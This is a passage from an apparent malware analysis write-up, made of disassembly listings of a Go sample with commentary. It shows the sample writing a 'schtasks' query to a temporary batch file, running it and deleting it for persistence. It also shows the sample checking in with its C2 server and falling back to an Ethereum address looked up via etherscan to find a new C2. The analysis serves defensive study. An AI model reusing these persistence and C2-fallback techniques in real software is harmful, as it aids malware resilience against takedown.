<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e89</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_170h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e91</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e96</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e9f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633ea8</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
</code></pre></div><p>The malware uses a <em>scheduled</em> task a persistence method. To check the
scheduled tasks on the machine, the malware executes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">    chcp 437 &amp;schtasks /Query /V /FO CSV &gt; %s
</code></pre></div><p>In the command, <code>%s</code> is replaced for the path to the output file described
earlier. The command <code>chcp</code> is used to change the consoles code page to
language <em>United States</em>. The commands are written to a batch file in the
<code>%TMP%</code> folder and executed, this is shown in the code snippet below.  After
the code is written to the file, the batch file is executed and removed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633800</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x2710</span> <span style="color:#75715e">; 10000
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633808</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063380d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633812</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633817</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063381a</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_e0h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633822</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_f0h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063382a</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633831</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633835</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_d0h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063383d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633842</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2Estring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633847</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063384c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633851</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_e0h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633859</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_e8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633861</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.int</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633868</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063386c</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633871</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633876</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2E64</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063387b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633880</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633885</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_f0h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063388d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_f8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633895</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006ca46b</span>] <span style="color:#75715e">; %s\JF908%d772.bat
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0063389c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338a0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x11</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338a9</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_e0h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338b1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338b6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338bf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338c8</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338cd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_30h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338d2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338d7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338dc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_80h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338e4</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_60h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338e9</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rdx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338ed</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_130h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338f5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rdx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006338fa</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_138h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633902</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rdx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633907</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.stringtoslicebyte</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063390c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633911</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633916</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063391b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_80h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633923</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rbx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633927</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063392c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rsi</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633931</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rdx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633936</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063393b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633940</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_28h</span>], <span style="color:#ae81ff">0x40000000</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633948</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.io_ioutil.WriteFile</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063394d</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_100h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633955</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006faf80</span>] <span style="color:#75715e">; /c
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0063395c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span> - <span style="color:#ae81ff">0x10</span>], <span style="color:#66d9ef">rbp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633961</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span> - <span style="color:#ae81ff">0x10</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633966</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.00456ac4</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063396b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rbp</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063396f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_80h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633977</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_110h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063397f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633984</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_118h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063398c</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006c7152</span>] <span style="color:#75715e">; cmd
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633993</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rdx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633997</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339a0</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_100h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339a8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rdx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339ad</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339b6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339bf</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os_exec.Command</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339c4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339c9</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339cd</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os_exec___Cmd_.CombinedOutput</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339d2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339d7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339dc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339e1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339e6</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">rbx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339e9</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x633b95</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339ef</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_80h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339f7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006339fb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633a00</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633a05</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.Remove</span>
</code></pre></div><p>If the scheduled task is missing, the malware adds it back again.</p>
<h2 id="dog_protect_cc_thread">dog_protect_cc_thread</h2>
<p>Every 25 minutes the malware checks in with the C2 server by sending a <em>GET</em>
request to <code>{C2URL}/CheckCC</code>. If it doesn&rsquo;t get a response, the malware uses
its backup method for finding a new C2 server. The malware uses the <em>Ethereum</em>
blockchain as a backup method. The snippet below shows that the malware is
preparing a query to <em>etherscan</em> to lookup the transaction list for the address
<em>0xb017eFb3339FfE0EB3dBF799Db6cb065376fFEda</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0d3</span>  <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x50</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0d7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>], <span style="color:#66d9ef">rbp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0dc</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0e1</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0e4</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_38h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0e9</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0f0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0f4</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x00836550</span>] <span style="color:#75715e">; 0xb017eFb3339FfE0EB3dBF799Db6cb065376fFEda
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0060e0fb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e100</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2Estring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e105</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e10a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e10f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_38h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e114</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e119</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006d73df</span>] <span style="color:#75715e">; http://api.etherscan.io/api?module=account&amp;action=txlist&amp;address=%s&amp;startblock=0&amp;endblock=99999999&amp;sort=asc&amp;apikey=YourApiKeyToken
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0060e120</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e124</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x82</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e12d</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e132</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e137</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e140</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e149</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e14e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e153</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_30h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e158</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
